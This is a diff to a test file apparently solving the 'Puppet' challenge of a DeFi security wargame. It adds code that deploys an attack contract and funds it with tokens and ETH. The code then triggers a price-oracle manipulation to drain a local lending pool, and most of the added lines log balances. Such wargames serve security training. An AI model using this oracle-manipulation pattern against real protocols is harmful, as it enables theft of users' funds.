@@ -103,6 +103,54 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // ATTACK CONTRACT DEPLOYMENT
+        const AttackPuppetPool = await ethers.getContractFactory('AttackPuppetPool', deployer);
+        this.attack = await AttackPuppetPool.deploy(this.uniswapExchange.address, this.lendingPool.address, this.token.address, attacker.address);
+
+        console.log("=== INITIAL STATE ===");
+        console.log("UNI EXCHANGE");
+        console.log(Number(await this.token.balanceOf(this.uniswapExchange.address)));
+        console.log(Number(await ethers.provider.getBalance(this.uniswapExchange.address)));
+        console.log("LENDING POOL");
+        console.log(Number(await this.token.balanceOf(this.lendingPool.address)));
+        console.log(Number(await ethers.provider.getBalance(this.lendingPool.address)));
+        console.log("ATTACKER");
+        console.log(Number(await this.token.balanceOf(attacker.address)));
+        console.log(Number(await ethers.provider.getBalance(attacker.address)));
+        console.log("CONTRACT ATTACK TOKEN BALANCE:");
+        console.log(Number(await this.token.balanceOf(this.attack.address)));
+        console.log("CONTRACT ATTACK ETH BALANCE:");
+        console.log(Number(await ethers.provider.getBalance(this.attack.address)));
+
+        // ATTACK
+        // 1. approve attacking contract to manage attacker's tokens
+        await this.token.connect(attacker).approve(this.attack.address, this.token.balanceOf(attacker.address));
+        // 2. transfer to attacking contact 999*10**18 tokens (not all, because we need to pass test, which tells us to have more than 1000*10**18)
+        await this.token.connect(attacker).transfer(this.attack.address,  ethers.utils.parseEther('999'));
+        // 3. transfer to contract most of attacker's eths
+        await attacker.sendTransaction({
+            to: this.attack.address,
+            value: ethers.utils.parseEther('24'),
+        });
+        // 4. attack (see contract's function)
+        await this.attack.attack();
+        
+        console.log("=== AFTER EXCHANGE STATE ===");
+        console.log("calculateDepositRequired");
+        console.log(Number(await this.lendingPool.calculateDepositRequired(await this.token.balanceOf(this.lendingPool.address))));
+        console.log("CONTRACT ATTACK TOKEN BALANCE:");
+        console.log(Number(await this.token.balanceOf(this.attack.address)));
+        console.log("CONTRACT ATTACK ETH BALANCE:");
+        console.log(Number(await ethers.provider.getBalance(this.attack.address)));
+        console.log("UNI EXCHANGE");
+        console.log(Number(await this.token.balanceOf(this.uniswapExchange.address)));
+        console.log(Number(await ethers.provider.getBalance(this.uniswapExchange.address)));
+        console.log("LENDING POOL");
+        console.log(Number(await this.token.balanceOf(this.lendingPool.address)));
+        console.log(Number(await ethers.provider.getBalance(this.lendingPool.address)));
+        console.log("ATTACKER");
+        console.log(Number(await this.token.balanceOf(attacker.address)));
+        console.log(Number(await ethers.provider.getBalance(attacker.address)));
     });
 
     after(async function () {
